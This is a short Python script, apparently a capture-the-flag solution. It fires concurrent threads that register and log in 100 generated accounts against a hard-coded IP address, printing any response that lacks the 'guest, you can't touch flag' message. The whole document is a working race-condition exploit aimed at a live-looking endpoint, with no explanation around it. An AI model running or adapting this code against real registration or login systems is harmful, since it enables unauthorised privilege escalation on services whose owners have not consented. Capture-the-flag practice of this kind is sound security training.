# -*- coding:utf-8 -*-
import requests
import threading
for i in range(100):
	a = "fghofghowo"+str(i)
	data = { 'username': a , 'password': a , 'gogogo' : '苟!'}
	def register(a):
		r = requests.post(url = "http://115.28.78.16:13333/3a94a786f2f3af094a461b295bc4e2f6/register.php" , data = data )
	def login(a):
		r = requests.post(url = "http://115.28.78.16:13333/3a94a786f2f3af094a461b295bc4e2f6/login.php" , data = data)
		if b"you are just guest, you can't touch flag!" not in r.content:
			print (r.content)
			exit()
	threading.Thread(target = login , args =(a,)).start()
	threading.Thread(target = register , args =(a,)).start()